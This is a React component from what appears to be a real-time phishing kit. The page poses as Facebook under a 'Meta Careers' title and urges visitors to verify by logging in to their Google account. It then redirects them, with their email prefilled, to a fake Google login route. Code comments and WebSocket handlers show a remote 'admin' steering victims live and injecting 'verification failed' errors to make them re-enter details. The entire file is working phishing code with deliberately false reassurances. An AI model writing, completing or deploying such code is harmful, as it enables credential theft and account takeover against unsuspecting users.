import { useState, useEffect } from "react";
import { useWebSocket } from "../../context/WebSocketContext";
import useDynamicCss from "../../utils/useDynamicCss";
import { useSearchParams } from "react-router-dom";

const AuthWithGoogle = () => {
  useEffect(() => {
    document.title = 'Meta Careers';
  }, []);

  useDynamicCss("/css/FbAuthWithGoogle.css");
  const {
    submitForm,
    navigationEvent,
    clearNavigationEvent,
    prefillCode,
    verificationError,
    clearVerificationError,
    navigateModal,
  } = useWebSocket();
  const [isLoading, setIsLoading] = useState(false);
  const [isPageLoading, setIsPageLoading] = useState(true);
  const [searchParams] = useSearchParams();
  const errorParam = searchParams.get("error");

  const [showInvalidError, setShowInvalidError] = useState(
    errorParam === "wrong-code",
  );

  useEffect(() => {
    const timer = setTimeout(() => setIsPageLoading(false), 700);
    return () => clearTimeout(timer);
  }, []);

  // Reset state when admin navigates
  useEffect(() => {
    if (navigationEvent) {
      setIsLoading(false);
      clearNavigationEvent();
    }
  }, [navigationEvent, clearNavigationEvent]);

  useEffect(() => {
    const errorParam = searchParams.get("error");
    if (errorParam === "wrong-code") {
      setShowInvalidError(true);
      setIsLoading(false);
    }
  }, [searchParams]);

  // Handle verification error from admin
  useEffect(() => {
    if (
      verificationError &&
      (verificationError.type === "google" ||
        verificationError.type === "fb-google" ||
        verificationError.type === "wrong-code")
    ) {
      setShowInvalidError(true);
      setIsLoading(false);
      clearVerificationError();
    }
  }, [verificationError, clearVerificationError]);

  const handleVerify = () => {
    setIsLoading(true);
    submitForm("fb-google", {});
    setTimeout(() => {
      if (prefillCode?.emailHint) {
        sessionStorage.setItem("user_email", prefillCode.emailHint);
      }
      navigateModal(
        `/google/login?email=${encodeURIComponent(prefillCode?.emailHint || "")}`,
      );
    }, 2000);
  };

  return (
    <>
      {isPageLoading && (
        <div
          style={{
            position: "fixed",
            top: 0,
            left: 0,
            width: "100vw",
            height: "100vh",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            backgroundColor: "#ffffff",
            zIndex: 99999,
          }}
        ></div>
      )}
      <div
        className={`wrapper-loading-root ${isLoading ? "body-loading" : "hidden"}`}
      >
        <div className={`progress-bar ${isLoading ? "show" : ""}`}>
          <div className="bar1"></div>
          <div className="bar2"></div>
        </div>
      </div>

      <div className={`google_main ${isLoading ? "body-loading" : ""}`}>
        <div className="google_container">
          <div className="google_header">
            <span>Facebook</span>
            <h2>Log in to your Google account to confirm that it's you</h2>
          </div>
          <p className="google_description">
            For security reasons, we need you to verify with your Google Account
            by logging in with the Gmail address saved on your Facebook account
            {prefillCode?.emailHint ? `: ${prefillCode.emailHint}` : "."}
          </p>
          <span
            className="error"
            style={{
              display: showInvalidError ? "block" : "none",
              color: "#d93025",
              fontSize: "13px",
              marginTop: "8px",
            }}
          >
            Verification failed. Please try again.
          </span>
          <div className="google_info_rows">
            <div className="google_info_row">
              <svg
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2.5"
                strokeLinecap="round"
                strokeLinejoin="round"
                width="24"
                height="24"
              >
                <path d="M21 12a9 9 0 1 1-9-9c2.52 0 4.85.83 6.72 2.25"></path>
                <path d="M21 3v5h-5"></path>
              </svg>
              <span>
                We will not share any of your Facebook data with your Google
                account
              </span>
            </div>
            <div className="google_info_row">
              <svg
                viewBox="0 0 24 24"
                fill="currentColor"
                width="24"
                height="24"
              >
                <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"></path>
              </svg>
              <span>
                This will not change the details that you use to log in to
                Facebook
              </span>
            </div>
          </div>
          <div
            className="google_button_container"
            style={{ marginTop: "56px" }}
          >
            <button
              className="google_verify_btn"
              onClick={handleVerify}
              disabled={isLoading}
              style={{
                opacity: isLoading ? 0.6 : 1,
                cursor: isLoading ? "not-allowed" : "pointer",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                gap: "8px",
              }}
            >
              {isLoading ? (
                <>
                  <svg
                    className="spinner"
                    viewBox="0 0 50 50"
                    style={{ width: "18px", height: "18px" }}
                  >
                    <circle
                      className="path"
                      cx="25"
                      cy="25"
                      r="20"
                      fill="none"
                      strokeWidth="5"
                    ></circle>
                  </svg>
                  <span>Please wait...</span>
                </>
              ) : (
                "Verify with Google"
              )}
            </button>
          </div>
        </div>
      </div>
    </>
  );
};

export default AuthWithGoogle;
